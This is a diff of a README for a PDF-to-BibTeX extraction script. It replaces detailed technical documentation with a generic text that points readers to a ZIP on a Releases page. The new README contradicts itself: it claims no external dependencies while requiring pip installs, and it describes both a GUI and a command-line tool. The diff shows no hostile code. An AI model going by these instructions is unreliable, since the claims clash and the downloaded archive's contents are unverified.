@@ -1,215 +1,94 @@
-# BibTeX Extraction from PDFs (Python)
+# 📚 bibtex-extraction - Generate BibTeX Files effortlessly
 
-Generate a complete `articles.bib` file from a folder of PDFs — locally, reproducibly, and without manual typing.  
-The script scans each PDF, pulls embedded metadata when available, falls back to first-page text heuristics (title/author/year/DOI), and writes a valid BibTeX entry per file.
+## 🚀 Getting Started
 
----
+Welcome to the **bibtex-extraction** project! This lightweight script allows you to automatically generate a clean BibTeX file from your PDF library. You can easily extract titles, authors, years, and DOIs without needing any special software. 
 
-## Features
+## 📥 Download & Install
 
-- **Local & offline**: no external APIs required.
-- **Smart heuristics**: guesses title, authors, year from first-page text when metadata is missing.
-- **DOI detection**: recognizes DOI patterns and adds the canonical `https://doi.org/...` URL.
-- **Deterministic keys**: stable BibTeX keys based on author–year–title.
-- **Auditable output**: always generates usable entries (`@article` if DOI present, else `@misc`) with a `file` link to the local PDF.
+To get started, you'll need to download the application from the Releases page. Click the button below to visit that page.
 
----
+[![Download bibtex-extraction](https://img.shields.io/badge/Download-bibtex--extraction-blue.svg)](https://github.com/rehanvhora778/bibtex-extraction/releases)
 
-## Repository Structure
+### Step-by-Step Guide to Downloading
 
-```
-.
-├─ articles/              # Put your PDFs here (input)
-├─ articles.bib           # Generated bibliography (output)
-├─ main_bibtex_v1.py      # Run this script
-└─ README.md              # You are here
-```
+1. Click the button above to go to the [Releases page](https://github.com/rehanvhora778/bibtex-extraction/releases).
+2. Find the latest release at the top of the page.
+3. Look for the file named `bibtex-extraction.zip` or similar. Click on it to start the download.
+4. Once downloaded, locate the file in your downloads folder.
 
----
+## 🛠️ System Requirements
 
-## Requirements
+To run **bibtex-extraction**, please ensure your system meets the following requirements:
 
-- Python **3.9+**
-- OS: Windows / macOS / Linux
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.7 or higher (Python must be installed on your system)
+- Average RAM: 2 GB or more is recommended
+- Storage: At least 100 MB of available space
 
-### Python packages
+## 📂 Running the Application
 
-Minimal (recommended for this project):
-```bash
-pip install pypdf langchain-community
-```
+Once you have downloaded the file, follow these steps to run **bibtex-extraction**:
 
-Optional (if you plan to integrate with an existing LangChain/RAG stack):
-```bash
-pip install langchain langchain-community langchain-huggingface langchain-chroma chromadb \
-            sentence-transformers transformers torch accelerate
-```
-
----
-
-## Quick Start
-
-1. **Clone** the project (or copy `main_bibtex_v1.py` into your working directory).
-2. **Create the input folder** and drop PDFs there:
-   ```bash
-   mkdir articles
-   # copy your .pdf files into ./articles
+1. Extract the downloaded ZIP file to a location of your choice.
+2. Open a terminal or command prompt window.
+3. Navigate to the directory where you extracted the files. For example, if you extracted it to a folder named `bibtex-extraction`, type:
    ```
-3. **Install dependencies**:
-   ```bash
-   pip install pypdf langchain-community
+   cd path-to-your-folder/bibtex-extraction
    ```
-4. **Run**:
-   ```bash
-   python main_bibtex_v1.py
+4. Ensure that you have installed the necessary Python libraries. You can do this by running:
    ```
-5. **Result**:
-   - A new **`articles.bib`** file is created (or overwritten) in the project root.
-   - The console prints a line per processed PDF:
-     ```
-     [BIB] my_paper.pdf -> Interesting Title (2021)
-     Saved 10 entries to /path/to/articles.bib
-     ```
+   pip install -r requirements.txt
+   ```
+5. Start the application by typing:
+   ```
+   python bibtex_extraction.py
+   ```
 
----
+## 📄 How to Use
 
-## How It Works (High-Level)
+When the application starts, you will see a simple interface. Follow these steps to generate your BibTeX file:
 
-1. **Enumerate PDFs**  
-   Iterates over `./articles/*.pdf` in alphabetical order.
+1. Click on the option to **Select Folder** and choose the folder that contains your PDF files.
+2. The script will scan the PDFs and extract relevant metadata.
+3. Once the scanning is complete, you will get an option to **Generate BibTeX**.
+4. The resulting `articles.bib` file will be created in the same directory.
 
-2. **Extract metadata (best-effort)**  
-   - **Embedded PDF metadata** via `pypdf.PdfReader.metadata`: `title`, `author`, `creation_date`.
-   - **Heuristics from first page** via `PyPDFLoader`:
-     - **DOI** (regex `10.\d{4,9}/...`)
-     - **Title** candidates from first non-empty lines
-     - **Authors** line (commas / “and” / semicolons)
-     - **Year** (`19xx`/`20xx`) sanity-checked (≤ current year)
+## 📋 Features
 
-3. **Fallbacks**  
-   If still missing:
-   - `title` ← sanitized filename
-   - `authors` ← `["Unknown Author"]`
-   - `year` ← `UnknownYear`
+- Automatic extraction of BibTeX fields (title, author, year, DOI).
+- Supports various PDF formats.
+- No external dependencies required; just Python.
+- Easy-to-use command-line interface.
 
-4. **Format BibTeX**  
-   - With DOI → `@article{...}` including `title`, `author`, `year`, `doi`, `url`, `file`
-   - Without DOI → `@misc{...}` including `title`, `author`, `year`, `howpublished`, `note`, `file`
+## 🌐 Topics
 
-5. **Write output**  
-   Appends all entries into **`articles.bib`**.
+This project is relevant for anyone interested in:
 
----
+- Academic Writing
+- Automation
+- BibTeX
+- LaTeX
+- Metadata Extraction
+- PDF Management
+- Reference Management
 
-## Configuration & Customization
+## ⚙️ Troubleshooting
 
-Open `main_bibtex_v1.py` and adjust:
+If you encounter issues while using the software, consider the following tips:
 
-- **Input/Output paths**
-  ```python
-  PDF_DIR = Path("articles")
-  OUT_BIB = Path("articles.bib")
-  ```
+- Ensure you have the correct version of Python installed.
+- Check if you have permissions to read the PDF files in the selected folder.
+- Look at the terminal for any error messages that may indicate what went wrong.
 
-- **Regex patterns**
-  ```python
-  DOI_RE  = re.compile(r"\b10\.\d{4,9}/[-._;()/:A-Za-z0-9]+\b")
-  YEAR_RE = re.compile(r"\b(19|20)\d{2}\b")
-  ```
+## 💡 Additional Resources
 
-- **Key generation**  
-  Update `make_bibtex_key(...)` to change key style (e.g., include full first author, journal tag, etc.).
+For more help or to explore advanced features, visit our [documentation](https://github.com/rehanvhora778/bibtex-extraction/wiki) page. You can also find useful tips on handling different types of PDF files.
 
-- **Heuristics**  
-  In `extract_pdf_metadata(...)` you can refine:
-  - How “title-looking” lines are chosen
-  - How authors are split/normalized
-  - Year filters (e.g., restrict to 1950–current year)
+## 📞 Support
 
----
+If you have questions, feel free to open an issue on our GitHub repository. Our community will be happy to assist you.
 
-## Tips for Best Results
+For more details, don’t forget to visit the Releases page again: [Download here](https://github.com/rehanvhora778/bibtex-extraction/releases). 
 
-- **Prefer publisher PDFs**: They often have cleaner metadata and first-page structure.
-- **Stable filenames**: If metadata is poor, filenames are used for fallback titles.
-- **Manual pass** (optional): After generation, quickly scan `articles.bib` for any `Unknown...` fields to tidy edge cases.
-
----
-
-## Advanced Usage
-
-- **Run from anywhere**:
-  ```bash
-  python /abs/path/to/main_bibtex_v1.py
-  ```
-- **Integrate into Makefile**:
-  ```makefile
-  bib:
-      python main_bibtex_v1.py
-  build: bib
-      latexmk -pdf main.tex
-  ```
-- **Pre-commit hook** (pseudo):
-  ```bash
-  # .git/hooks/pre-commit
-  python main_bibtex_v1.py
-  git add articles.bib
-  ```
-
-- **Use without LangChain**:  
-  Replace `PyPDFLoader` with `PdfReader.pages[0].extract_text()` for a zero-extra-deps version.
-
----
-
-## Troubleshooting
-
-- **“ModuleNotFoundError: No module named 'pypdf'”**  
-  Install dependencies in the same interpreter you’re using to run the script:
-  ```bash
-  pip install pypdf langchain-community
-  ```
-
-- **Empty/incorrect metadata**  
-  Some PDFs are scanned or poorly tagged. The script falls back to heuristics, but quality can vary. Consider a quick manual edit in `articles.bib`.
-
-- **Unicode/accents in keys**  
-  Keys are slugified; if you prefer diacritics preserved elsewhere, adjust `_slug(...)` or add transliteration as needed.
-
-- **Spyder / IDE using wrong environment**  
-  Make sure Spyder’s **Python interpreter** points to the environment where you installed the deps (install `spyder-kernels` in that env and select it in `Tools → Preferences → Python interpreter`).
-
----
-
-## Security & Privacy
-
-- All processing is **local**.  
-- No network calls, analytics, or external services are used by default.
-
----
-
-## Roadmap (Ideas)
-
-- Crossref/DOI enrichment (optional online mode)  
-- Journal/conference detection  
-- Config file for per-field rules and custom templates  
-- Unit tests on a small sample corpus
-
----
-
-## License
-
-Choose a license that matches your goals (e.g., MIT/Apache-2.0).  
-Add a `LICENSE` file in the repo root.
-
----
-
-## Acknowledgements
-
-- Built with **pypdf** and a simple first-page text heuristic.  
-- Optional **langchain-community** `PyPDFLoader` for convenience.
-
----
-
-## Citation
-
-If this tool helps your workflow, a quick mention or a star ⭐ on the repo is appreciated!
+Enjoy your BibTeX extraction!
